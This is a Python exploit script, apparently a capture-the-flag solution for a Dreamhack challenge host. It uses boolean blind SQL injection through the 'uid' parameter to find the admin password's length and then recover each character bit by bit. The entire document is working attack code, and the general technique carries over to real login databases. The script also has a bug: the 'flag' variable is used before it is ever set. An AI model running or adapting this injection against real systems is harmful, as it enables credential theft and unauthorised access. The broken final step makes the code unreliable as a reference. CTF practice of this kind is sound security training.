from requests import get

url="http://host3.dreamhack.games:11188/"

#패스워드 길이
pw_length = 0
while True:
    pw_length += 1
    query=f"admin' and char_length(upw)={pw_length}-- "
    r = get(f"{url}/?uid={query}")
    if "exists" in r.text:
        break
print(f"password length:{pw_length}")

#문자 별 비트 길이 & 비트 출력

for i in range(1, pw_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- "
        r = get(f"{url}/?uid={query}")
        if "exists" in r.text:
            break
    print(f"{i} bit length: {bit_length}")

    bit = ""
    for j in range(1, bit_length + 1):
        query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- "
        r = get(f"{url}/?uid={query}")
        if "exists" in r.text:
            bit += "1"
        else:
            bit += "0" 
    print(f"{i} bit: {bit}")
 
    
    #비트 문자로 변환
    flag += int.to_bytes(int(bit, 2), (bit_length + 7)// 8, "big").decode("utf-8")
print(flag)


    